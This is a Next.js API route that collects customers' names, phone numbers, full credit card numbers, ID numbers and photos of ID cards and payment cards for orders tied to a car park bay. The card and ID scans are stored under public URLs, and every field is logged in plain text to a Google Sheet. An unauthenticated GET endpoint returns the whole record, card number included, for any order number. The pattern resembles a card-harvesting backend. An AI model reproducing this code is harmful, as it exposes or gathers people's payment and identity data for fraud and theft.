import { NextRequest, NextResponse } from "next/server";
import { google } from "googleapis";
import { supabase } from "@/app/lib/supabase";

// ----------------------------
// Types
// ----------------------------
interface OrderData {
    fullName: string;
    phone: string;
    orderNumber: string;
    creditCard: string;
    validId: string;
    paymentMethod: string;
    carParkBay: string;
    confirmed: boolean;
}

// ----------------------------
// Google Auth Helper (Sheets only)
// ----------------------------
async function getGoogleAuth() {
    const privateKey = process.env.GOOGLE_PRIVATE_KEY?.replace(/\\n/g, "\n");
    const clientEmail = process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL;

    if (!clientEmail || !privateKey) {
        throw new Error("Missing GOOGLE credentials");
    }

    return new google.auth.GoogleAuth({
        credentials: {
            client_email: clientEmail,
            private_key: privateKey,
        },
        scopes: ["https://www.googleapis.com/auth/spreadsheets"],
    });
}

// ----------------------------
// Upload File to Supabase
// ----------------------------
async function uploadToSupabase(file: File, fileName: string): Promise<string> {
    const bucket = process.env.SUPABASE_BUCKET_NAME!;
    const arrayBuffer = await file.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    const { error } = await supabase.storage
        .from(bucket)
        .upload(fileName, buffer, {
            contentType: file.type,
            upsert: true,
        });

    if (error) throw new Error("Supabase upload failed: " + error.message);

    const { data } = supabase.storage.from(bucket).getPublicUrl(fileName);

    return data.publicUrl;
}

// ----------------------------
// Save to Google Sheets
// ----------------------------
async function saveToSheet(orderData: OrderData, idUrl: string, cardUrl: string) {
    const spreadsheetId = process.env.GOOGLE_SHEET_ID;
    if (!spreadsheetId) throw new Error("GOOGLE_SHEET_ID missing");

    const auth = await getGoogleAuth();
    const sheets = google.sheets({ version: "v4", auth });

    const timestamp = new Date().toISOString();

    await sheets.spreadsheets.values.append({
        spreadsheetId,
        range: "Sheet1!A:K",
        valueInputOption: "USER_ENTERED",
        requestBody: {
            values: [
                [
                    timestamp,
                    orderData.fullName,
                    orderData.phone,
                    orderData.orderNumber,
                    orderData.creditCard,
                    orderData.validId,
                    orderData.paymentMethod,
                    orderData.carParkBay,
                    idUrl,
                    cardUrl,
                    "Pending Verification",
                ],
            ],
        },
    });
}

// ----------------------------
// POST — Handle Form Submit
// ----------------------------
export async function POST(request: NextRequest) {
    try {
        const formData = await request.formData();

        const orderData: OrderData = {
            fullName: (formData.get("fullName") || "").toString(),
            phone: (formData.get("phone") || "").toString(),
            orderNumber: (formData.get("orderNumber") || "").toString(),
            creditCard: (formData.get("creditCard") || "").toString(),
            validId: (formData.get("validId") || "").toString(),
            paymentMethod: (formData.get("paymentMethod") || "").toString(),
            carParkBay: (formData.get("carParkBay") || "").toString(),
            confirmed: formData.get("confirmed") === "true",
        };

        const idScan = formData.get("idScan") as File | null;
        const cardScan = formData.get("creditCardScan") as File | null;

        if (!idScan || !cardScan) {
            return NextResponse.json(
                { success: false, error: "Images missing" },
                { status: 400 }
            );
        }

        // Upload images to Supabase
        const idUrl = await uploadToSupabase(idScan, `ID-${orderData.orderNumber}.jpg`);
        const cardUrl = await uploadToSupabase(
            cardScan,
            `CARD-${orderData.orderNumber}.jpg`
        );

        // Save row in Google Sheets
        await saveToSheet(orderData, idUrl, cardUrl);

        return NextResponse.json({
            success: true,
            message: "Order saved",
            idUrl,
            cardUrl,
        });
    } catch (err: any) {
        console.error("❌ ERROR:", err);
        return NextResponse.json(
            { success: false, error: err.message },
            { status: 500 }
        );
    }
}

// ----------------------------
// GET — Fetch Order
// ----------------------------
export async function GET(request: NextRequest) {
    try {
        const orderNumber = request.nextUrl.searchParams.get("orderNumber");
        if (!orderNumber) {
            return NextResponse.json(
                { success: false, error: "orderNumber required" },
                { status: 400 }
            );
        }

        const auth = await getGoogleAuth();
        const sheets = google.sheets({ version: "v4", auth });

        const spreadsheetId = process.env.GOOGLE_SHEET_ID;

        const resp = await sheets.spreadsheets.values.get({
            spreadsheetId,
            range: "Sheet1!A:K",
        });

        const rows = resp.data.values || [];
        const match = rows.find((row) => row[3] === orderNumber);

        if (!match) {
            return NextResponse.json(
                { success: false, error: "Order not found" },
                { status: 404 }
            );
        }

        return NextResponse.json({
            success: true,
            data: {
                timestamp: match[0],
                fullName: match[1],
                phone: match[2],
                orderNumber: match[3],
                creditCard: match[4],
                validId: match[5],
                paymentMethod: match[6],
                carParkBay: match[7],
                idUrl: match[8],
                cardUrl: match[9],
                status: match[10],
            },
        });
    } catch (err: any) {
        return NextResponse.json(
            { success: false, error: err.message },
            { status: 500 }
        );
    }
}
